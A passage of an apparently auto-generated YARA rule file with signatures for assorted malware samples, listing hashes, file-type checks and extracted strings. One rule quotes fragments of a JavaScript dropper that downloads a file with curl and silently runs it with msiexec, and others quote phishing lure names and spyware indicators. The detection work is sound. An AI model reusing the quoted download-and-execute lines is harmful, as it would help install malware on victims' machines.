      $s14 = "]@`<&5|!+#2+@`?'`<(%7?8" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Rx' */
      $s15 = "'~|+&(~5+*!8" fullword ascii /* score: '9.00'*/ /* hex encoded string 'X' */
   condition:
      uint16(0) == 0x5c7b and filesize < 200KB and
      8 of them
}

rule sig_6fd1096080d1b5db1306ebe7a393b290fa19348b23c1c4085250218225e5de00_6fd10960 {
   meta:
      description = "_subset_batch - file 6fd1096080d1b5db1306ebe7a393b290fa19348b23c1c4085250218225e5de00_6fd10960.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6fd1096080d1b5db1306ebe7a393b290fa19348b23c1c4085250218225e5de00"
   strings:
      $s1 = "b1PlsurF6PyI0jBPjjxyYq6Pu9MJTsC3ivvWao16Pqh18ShmorSxFvKEyPGdRCX4V4w56XytDzZZ34nhWM00xEAT00NXtJmerlZ0qsMbR7jT9M6BkYmf4XGAuDsYmGTX" ascii /* score: '14.00'*/
      $s2 = "{\\*\\aup843891794 \\bin00000\\843891794167473908 LPGQxlvZP1SN6tFxk04HXYp2TRQnrSzPFqPdQ3u2li76pyAfCyFXTaDPkUev1PwB9cpHrh4F7dOCgv" ascii /* score: '12.00'*/
      $s3 = " 00000" fullword ascii /* reversed goodware string '00000 ' */ /* score: '11.00'*/
      $s4 = "dNxFzurGx4NzE9fjQcPFmz9mDxpHMoeyA383WKTnFV5kH7TF6xFDU2VCSePZQny3jsAYFSE7RWKBUqEAmZV9aArv3YaJNSZaE6CHY3oGQOErG7ZXLjMYTBpztyW3aY5Z" ascii /* score: '11.00'*/
      $s5 = "Eljlt2OaEkG8F0sS4PBFvRZoBzDHpBV03VrLA3hWkDmu0PcSRBLMiaf4qh8SVThHlqRruyZ6bxjbIVWDo8DdLSnRSkGGan4EdwyisSzD36fcswcbVQJRai1nKI85rmfn" ascii /* score: '11.00'*/
      $s6 = "~%/?6%$5?)3*1" fullword ascii /* score: '9.00'*/ /* hex encoded string 'e1' */
      $s7 = "%5&*?;^,8" fullword ascii /* score: '9.00'*/ /* hex encoded string 'X' */
      $s8 = "2-8%]%[)&," fullword ascii /* score: '9.00'*/ /* hex encoded string '(' */
      $s9 = "%|^%<59|~6([]!!9-*" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Yi' */
      $s10 = ".?/5_|%-?527<.);." fullword ascii /* score: '9.00'*/ /* hex encoded string 'U'' */
      $s11 = "*&%=%:?-=*5,['9#%%*~~^" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Y' */
      $s12 = ".%4`;):~>]?@3!-?4^+]^?|@/?8" fullword ascii /* score: '9.00'*/ /* hex encoded string 'CH' */
      $s13 = "36,^%`6#)1<;|;`?>~^46" fullword ascii /* score: '9.00'*/ /* hex encoded string '6aF' */
      $s14 = "~?|%?/?;5:._2" fullword ascii /* score: '9.00'*/ /* hex encoded string 'R' */
      $s15 = "6~@$?9*??.&&?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
   condition:
      uint16(0) == 0x5c7b and filesize < 200KB and
      8 of them
}

rule sig_4443f23c07dddf6215324e9b8d17e0b3_imphash_ {
   meta:
      description = "_subset_batch - file 4443f23c07dddf6215324e9b8d17e0b3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f3183573c84183bcb4dd72d072210ebca2104c2dbd917c2d3762ea8a3db9603f"
   strings:
      $s1 = "CryptDestroyHashCryptSetKeyParamCryptGetKeyParam" fullword ascii /* score: '15.00'*/
      $s2 = "SetDllDirectoryWs" fullword ascii /* score: '9.00'*/
      $s3 = "stobjectkernel32explorer" fullword wide /* score: '9.00'*/
      $s4 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule sig_1a051e4a3b62cd2d4f175fb443f5172da0b40af27c5d1ffae21fde13536dd3e1_1a051e4a {
   meta:
      description = "_subset_batch - file 1a051e4a3b62cd2d4f175fb443f5172da0b40af27c5d1ffae21fde13536dd3e1_1a051e4a.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1a051e4a3b62cd2d4f175fb443f5172da0b40af27c5d1ffae21fde13536dd3e1"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "<key>com.apple.security.get-task-allow</key>" fullword ascii /* score: '18.00'*/
      $s3 = "<key>com.apple.security.temporary-exception.files.absolute-path.read-only</key>" fullword ascii /* score: '17.00'*/
      $s4 = "<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>" fullword ascii /* score: '14.00'*/
      $s5 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" fullword ascii /* score: '13.00'*/
      $s6 = "/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation" fullword ascii /* score: '13.00'*/
      $s7 = "/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit" fullword ascii /* score: '13.00'*/
      $s8 = "Get Frontmost App Error" fullword ascii /* score: '12.00'*/
      $s9 = "**** SIZE TOO BIG ****" fullword ascii /* score: '12.00'*/
      $s10 = "public.utf8-plain-text" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 100KB and
      all of them
}

rule sig_152974a7fb36411dbe0fc15a99675e57_imphash_ {
   meta:
      description = "_subset_batch - file 152974a7fb36411dbe0fc15a99675e57(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3c8f5cc608e3a4a755fe1a2b099154153fb7a88e581f3b122777da399e698cca"
   strings:
      $s1 = "%sV%08X.bin" fullword wide /* score: '11.00'*/
      $s2 = "MakeScreenshot1 biWidth, max_width, biHeight, max_height: %d,%d,%d,%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule sig_1deeab33a3db0d2c20caa9f7afb33436_imphash_ {
   meta:
      description = "_subset_batch - file 1deeab33a3db0d2c20caa9f7afb33436(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "63d2e31f6edb396449b0809bbdea768118fb44417538bae83d508d6fe19544ec"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "TSpy:S+" fullword ascii /* score: '9.00'*/
      $s5 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s6 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s7 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule sig_3ff21b165e6f5fd25733138a72cb7e1368dcbb8097d4b52ca614219bcb8a0fc7_3ff21b16 {
   meta:
      description = "_subset_batch - file 3ff21b165e6f5fd25733138a72cb7e1368dcbb8097d4b52ca614219bcb8a0fc7_3ff21b16.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3ff21b165e6f5fd25733138a72cb7e1368dcbb8097d4b52ca614219bcb8a0fc7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "DHL Shipment CDE Awb 7213976346.exe" fullword ascii /* score: '19.00'*/
      $s6 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s7 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s8 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s9 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s10 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
      $s11 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s12 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x4844 and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule sig_4c6e15bf83923308fd98dabbd3bb5897_imphash_ {
   meta:
      description = "_subset_batch - file 4c6e15bf83923308fd98dabbd3bb5897(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d13f7ec5cbf3a1b263fa679562ea37b371b7fdccc2fd7b72f438b9e91cdc3ca8"
   strings:
      $s1 = "C:\\agent\\_work\\2\\s\\SonicStage\\Solution\\Bin\\Release\\SsCustom.pdb" fullword ascii /* score: '30.00'*/
      $s2 = "SsCustom.dll" fullword wide /* score: '23.00'*/
      $s3 = "SonicStage.exe" fullword wide /* score: '22.00'*/
      $s4 = "SsBackup.exe" fullword wide /* score: '22.00'*/
      $s5 = "LPStation.exe" fullword wide /* score: '22.00'*/
      $s6 = "LPLauncher.exe" fullword wide /* score: '22.00'*/
      $s7 = "LPStreaming.exe" fullword wide /* score: '22.00'*/
      $s8 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s9 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s10 = "http://ocsp.digicert.com0X" fullword ascii /* score: '14.00'*/
      $s11 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s12 = "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" fullword ascii /* score: '13.00'*/
      $s13 = "Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0" fullword ascii /* score: '13.00'*/
      $s14 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s15 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_3407bb223e1337cb41cd96dd8121489f88bface0ad5e9586f1d3ab4ba2ba1c1b_3407bb22 {
   meta:
      description = "_subset_batch - file 3407bb223e1337cb41cd96dd8121489f88bface0ad5e9586f1d3ab4ba2ba1c1b_3407bb22.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3407bb223e1337cb41cd96dd8121489f88bface0ad5e9586f1d3ab4ba2ba1c1b"
   strings:
      $x1 = "        shell.Run('msiexec /i \"' + downloadPath + '\" /quiet /qn', 0, true);" fullword ascii /* score: '36.00'*/
      $s2 = "        var curlCommand = 'curl \"' + var1817 + '\" -o \"' + downloadPath + '\"';" fullword ascii /* score: '25.00'*/
      $s3 = "    shell.Run(\"rundll32 url.dll,FileProtocolHandler \" + url, 1, true);" fullword ascii /* score: '23.00'*/
      $s4 = "function executeDownload(url) {" fullword ascii /* score: '18.00'*/
      $s5 = "        shell.Run(curlCommand, 0, true);" fullword ascii /* score: '18.00'*/
      $s6 = "// Executar fun" fullword ascii /* score: '16.00'*/
      $s7 = "        var downloadPath = var5663 + \"\\\\\\\\\" + var7446 + \".exe\";" fullword ascii /* score: '16.00'*/
      $s8 = "digo gerado pelo Advanced Javascript Obfuscator V2.0 - PHP Edition" fullword ascii /* score: '14.00'*/
      $s9 = "        executeDownload(var8922);" fullword ascii /* score: '13.00'*/
      $s10 = "vel: medium, Anti-Debug, String-Encryption, Control-Flow" fullword ascii /* score: '11.00'*/
      $s11 = "        // Executar arquivo baixado" fullword ascii /* score: '11.00'*/
      $s12 = "function downloadAndInstall() {" fullword ascii /* score: '10.00'*/
      $s13 = "// Configura" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2f0a and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule sig_737b577e2c20319688aa7e2758edb45b10217f86bc0021f226cb827b1f695d08_737b577e {
   meta:
      description = "_subset_batch - file 737b577e2c20319688aa7e2758edb45b10217f86bc0021f226cb827b1f695d08_737b577e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "737b577e2c20319688aa7e2758edb45b10217f86bc0021f226cb827b1f695d08"
   strings:
      $s1 = "var ie6 = $.browser.msie && /MSIE 6.0/.test(navigator.userAgent) && !mode;" fullword ascii /* score: '28.00'*/
      $s2 = " * Examples at: http://malsup.com/jquery/block/" fullword ascii /* score: '21.00'*/
      $s3 = "// don't ask; if you really must know: http://groups.google.com/group/jquery-en/browse_thread/thread/36640a8730503595/2f6a79a77a" ascii /* score: '20.00'*/
      $s4 = "var fwd = !e.shiftKey && e.target === els[els.length-1];" fullword ascii /* score: '20.00'*/
      $s5 = "// don't ask; if you really must know: http://groups.google.com/group/jquery-en/browse_thread/thread/36640a8730503595/2f6a79a77a" ascii /* score: '20.00'*/
      $s6 = "var back = e.shiftKey && e.target === els[0];" fullword ascii /* score: '20.00'*/
      $s7 = "full ? s.setExpression('height','Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.boxModel?0:'+opts.qu" ascii /* score: '19.00'*/
      $s8 = "if (($.browser.msie || opts.forceIframe) && opts.showOverlay)" fullword ascii /* score: '19.00'*/
      $s9 = "full ? s.setExpression('height','Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.boxModel?0:'+opts.qu" ascii /* score: '19.00'*/
      $s10 = "var setExpr = $.browser.msie && (($.browser.version < 8 && !mode) || mode < 8);" fullword ascii /* score: '19.00'*/
      $s11 = "lyr3.find('.ui-widget-content').append(msg);" fullword ascii /* score: '17.00'*/
      $s12 = "if (!opts.theme && (!opts.applyPlatformOpacityRules || !($.browser.mozilla && /Linux/.test(navigator.platform))))" fullword ascii /* score: '16.00'*/
      $s13 = "if ($.browser.msie || opts.forceIframe)" fullword ascii /* score: '16.00'*/
      $s14 = "if (full) s.setExpression('top','(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight " ascii /* score: '16.00'*/
      $s15 = "var lyr1 = ($.browser.msie || opts.forceIframe)" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 60KB and
      8 of them
}

rule sig_2d7847e1b6289ade3c7ab13a185fad64_imphash_ {
   meta:
      description = "_subset_batch - file 2d7847e1b6289ade3c7ab13a185fad64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c6f683d875c4d7b463750391aa68524d517400900da8317069de4f7ac6a703b0"
   strings:
      $s1 = "http://www.scuio.com" fullword wide /* score: '21.00'*/
      $s2 = "            processorArchitecture=\"X86\" " fullword ascii /* score: '10.00'*/
      $s3 = "<description>Your app description here</description> " fullword ascii /* score: '10.00'*/
      $s4 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s5 = "    processorArchitecture=\"X86\" " fullword ascii /* score: '10.00'*/
      $s6 = "            publicKeyToken=\"6595b64144ccf1df\" " fullword ascii /* score: '8.00'*/
      $s7 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule sig_57e98d9a5a72c8d7ad8fb7a6a58b3daf_imphash_ {
   meta:
      description = "_subset_batch - file 57e98d9a5a72c8d7ad8fb7a6a58b3daf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "515b31c49856e26ccc0cb6748a330609a994b9bd729bb4492e6bf48fe68494dc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "mimoses filmen.exe" fullword wide /* score: '19.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "iC* /o" fullword ascii /* score: '9.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s10 = "eOKB:y!." fullword ascii /* score: '8.00'*/
      $s11 = "gibbernakkernes" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule sig_176e894661aa9cdc9a5cba6c720044cbbf7b8bd80d1c9a142a7c24b1b6c50d15_176e8946 {
   meta:
      description = "_subset_batch - file 176e894661aa9cdc9a5cba6c720044cbbf7b8bd80d1c9a142a7c24b1b6c50d15_176e8946.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "176e894661aa9cdc9a5cba6c720044cbbf7b8bd80d1c9a142a7c24b1b6c50d15"
   strings:
      $x1 = "`),v=y.length-1,v>0?(k=a+v,S=w-y[v].length):(k=a,S=s),T=D.comment,a=k,p=k,d=w-S):c===D.slash?(w=o,T=c,p=a,d=o-s,l=w+1):(w=OA(t,o" ascii /* score: '80.00'*/
      $x2 = "(()=>{var qv=Object.create;var Hi=Object.defineProperty;var $v=Object.getOwnPropertyDescriptor;var Lv=Object.getOwnPropertyNames" ascii /* score: '70.00'*/
      $x3 = "`))})}displayType(e){for(let t of e.parent.nodes)if(t.prop===\"display\"){if(t.value.includes(\"flex\"))return\"flex\";if(t.valu" ascii /* score: '56.00'*/
      $x4 = "In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)}function yk(r,e){if(!!r){if(typeof r==\"str" ascii /* score: '55.00'*/
      $x5 = "\",CHAR_UNDERSCORE:\"_\",CHAR_VERTICAL_LINE:\"|\",CHAR_ZERO_WIDTH_NOBREAK_SPACE:\"\\uFEFF\"}});var Nm=x((s6,Mm)=>{u();\"use stri" ascii /* score: '51.00'*/
      $x6 = "`);w.push(`  Use \\`${r.replace(\"[\",`[${E}:`)}\\` for \\`${T.trim()}\\``);break}G.warn([`The class \\`${r}\\` is ambiguous and" ascii /* score: '50.00'*/
      $x7 = "`))}gv.exports=Dr;function Dr(...r){let e;if(r.length===1&&V5(r[0])?(e=r[0],r=void 0):r.length===0||r.length===1&&!r[0]?r=void 0" ascii /* score: '47.00'*/
      $x8 = "`))});c.push([p,d,h])}}for(let[l,[c,f]]of o){let d=[];for(let[h,b,v]of c){let y=[h,...Fg([h],e.tailwindConfig.separator)];for(le" ascii /* score: '47.00'*/
      $x9 = "`)}insert(e,t,i){let n=this.set(this.clone(e),t);if(!(!n||e.parent.some(a=>a.prop===n.prop&&a.value===n.value)))return this.need" ascii /* score: '43.00'*/
      $x10 = "\".charCodeAt(0),xn=\"\\r\".charCodeAt(0),Wx=\"[\".charCodeAt(0),Gx=\"]\".charCodeAt(0),Qx=\"(\".charCodeAt(0),Yx=\")\".charCode" ascii /* score: '43.00'*/
      $x11 = "`))if(n=n.trim(),!i.has(n))if(i.add(n),Li.get(e).has(n))for(let s of Li.get(e).get(n))t.add(s);else{let s=e(n).filter(o=>o!==\"!" ascii /* score: '38.00'*/
      $x12 = "https://www.w3ctech.com/topic/2226`));let o=t(...a);return o.postcssPlugin=e,o.postcssVersion=new Ta().version,o}let s;return Ob" ascii /* score: '37.00'*/
      $x13 = "`),t}].filter(Boolean)}};Ql.exports.postcss=!0});var _y=x((Gq,Cy)=>{u();Cy.exports=Ay()});var Yl=x((Qq,Ey)=>{u();Ey.exports=()=>" ascii /* score: '35.00'*/
      $x14 = "nesting or configure the `tailwindcss/nesting` plugin:\",\"https://tailwindcss.com/docs/using-with-preprocessors#nesting\"].join" ascii /* score: '34.00'*/
      $x15 = "`);i=new Array(s.length);let a=0;for(let o=0,l=s.length;o<l;o++)i[o]=a,a+=s[o].length+1;this[va]=i}t=i[i.length-1];let n=0;if(e>" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2828 and filesize < 1000KB and
      1 of ($x*)
}

rule sig_6e4a48d04f7b4e2b81af4739d4bf82a4_imphash_ {
   meta:
      description = "_subset_batch - file 6e4a48d04f7b4e2b81af4739d4bf82a4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "627b920845683bd7303d33946ff52fb2ea595208452285457aa5ccd9c01c3b0a"
   strings:
      $s1 = "  %s Microsoft-Windows-Powershell/Operational \\\\VBOXSVR\\tmp\\ps.xml" fullword wide /* score: '23.00'*/
      $s2 = "Y:\\vt-windows-event-stream\\Release\\vt-windows-event-stream.pdb" fullword ascii /* score: '19.00'*/
      $s3 = "  %s Microsoft-Windows-Sysmon/Operational \\\\VBOXSVR\\tmp\\sysmon.xml" fullword wide /* score: '18.00'*/
      $s4 = "Usage: %s <LogPath> <output_file_name>" fullword wide /* score: '17.00'*/
      $s5 = "  %s Microsoft-Windows-Sysmon/Operational sysmon.xml" fullword wide /* score: '15.00'*/
      $s6 = "  %s Security \\\\VBOXSVR\\tmp\\security.xml" fullword wide /* score: '13.00'*/
      $s7 = "WriteFile failed with %d.  buffSize=%d  Written=%d" fullword wide /* score: '10.00'*/
      $s8 = "WriteFile failed: %d." fullword wide /* score: '10.00'*/
      $s9 = "Ctrl-Logoff event" fullword ascii /* score: '9.00'*/
      $s10 = "6$6*60666@6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'f`ff' */
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_44bc374745cec6694b8e974b7384a0a58b3106ae61df95266c8c7620507b5b55_44bc3747 {
   meta:
      description = "_subset_batch - file 44bc374745cec6694b8e974b7384a0a58b3106ae61df95266c8c7620507b5b55_44bc3747.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "44bc374745cec6694b8e974b7384a0a58b3106ae61df95266c8c7620507b5b55"
   strings:
      $s1 = "2. Launch Everwind_0.3.0_x64.exe" fullword ascii /* score: '19.00'*/
      $s2 = "Everwind_0.3.0_x64.exe" fullword ascii /* score: '19.00'*/
      $s3 = "README.txt1. Unpack this archive" fullword ascii /* score: '14.00'*/
      $s4 = ")[$2\">\"1" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s5 = "owvfvvv" fullword ascii /* score: '8.00'*/
      $s6 = "cvvvvvvv" fullword ascii /* score: '8.00'*/
      $s7 = "fggfggg" fullword ascii /* score: '8.00'*/
      $s8 = "dcbkkaa" fullword ascii /* score: '8.00'*/
      $s9 = "aykxykl" fullword ascii /* score: '8.00'*/
      $s10 = "fbaaiab" fullword ascii /* score: '8.00'*/
      $s11 = "owgggwg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 13000KB and
      8 of them
}

rule sig_0975b172f22deff878d2f0c06ffce6aac9b7da5b7ddcc8ed991bfbfdb9bb6feb_0975b172 {
   meta:
      description = "_subset_batch - file 0975b172f22deff878d2f0c06ffce6aac9b7da5b7ddcc8ed991bfbfdb9bb6feb_0975b172.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0975b172f22deff878d2f0c06ffce6aac9b7da5b7ddcc8ed991bfbfdb9bb6feb"
   strings:
      $s1 = "xl/printerSettings/printerSettings1.bin" fullword ascii /* score: '10.00'*/
      $s2 = "HNNFzz:\"\"\"" fullword ascii /* score: '10.00'*/
      $s3 = "'%%!!!" fullword ascii /* score: '10.00'*/
      $s4 = "xl/sharedStrings.xml|[i" fullword ascii /* score: '10.00'*/
      $s5 = "matplotlib version3.1.0, http://matplotlib.org/" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 300KB and
      all of them
}

rule sig_7ea447e8f6f0685afb3ae17a54e6acfc62d68ad4aaeeea1ecc7adbc6d3b515dd_7ea447e8 {
   meta:
      description = "_subset_batch - file 7ea447e8f6f0685afb3ae17a54e6acfc62d68ad4aaeeea1ecc7adbc6d3b515dd_7ea447e8.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7ea447e8f6f0685afb3ae17a54e6acfc62d68ad4aaeeea1ecc7adbc6d3b515dd"
   strings:
      $s1 = "customXml/itemProps1.xml " fullword ascii /* score: '14.00'*/
      $s2 = "customXml/itemProps3.xml " fullword ascii /* score: '14.00'*/
      $s3 = "customXml/itemProps2.xml " fullword ascii /* score: '14.00'*/
      $s4 = "customXml/itemProps1.xmlPK" fullword ascii /* score: '11.00'*/
      $s5 = "customXml/itemProps3.xmlPK" fullword ascii /* score: '11.00'*/
      $s6 = "customXml/itemProps2.xmlPK" fullword ascii /* score: '11.00'*/
      $s7 = "xl/sharedStrings.xml" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 400KB and
      all of them
}

rule sig_0ba20635d2778dc3b1e64694ff59bd63dfef9bab05b6a9eb67aa5e41bf9ef2fb_0ba20635 {
   meta:
      description = "_subset_batch - file 0ba20635d2778dc3b1e64694ff59bd63dfef9bab05b6a9eb67aa5e41bf9ef2fb_0ba20635.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0ba20635d2778dc3b1e64694ff59bd63dfef9bab05b6a9eb67aa5e41bf9ef2fb"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:9b1c6789-f91e-2744-9a78-b906151ef1df\" stEvt:when=\"2019-04-09T10:50:27+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = ")lKaILR:\"zF" fullword ascii /* score: '10.00'*/
      $s5 = "019-04-09T10:50:27+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s6 = "?\"|7[&e2E%\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '~.' */
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_60302e7b452dc63f3618c8e1b5356bda952b3e9c51da940a33a5388da08029bf_60302e7b {
   meta:
      description = "_subset_batch - file 60302e7b452dc63f3618c8e1b5356bda952b3e9c51da940a33a5388da08029bf_60302e7b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "60302e7b452dc63f3618c8e1b5356bda952b3e9c51da940a33a5388da08029bf"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:815de56b-f295-984e-b093-a43429eec0f2\" stEvt:when=\"2019-04-09T10:50:15+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:50:15+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_66ce354173f1513c5ebd796471615093a703963ce050c1be348748e14e4f731a_66ce3541 {
   meta:
      description = "_subset_batch - file 66ce354173f1513c5ebd796471615093a703963ce050c1be348748e14e4f731a_66ce3541.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "66ce354173f1513c5ebd796471615093a703963ce050c1be348748e14e4f731a"
   strings:
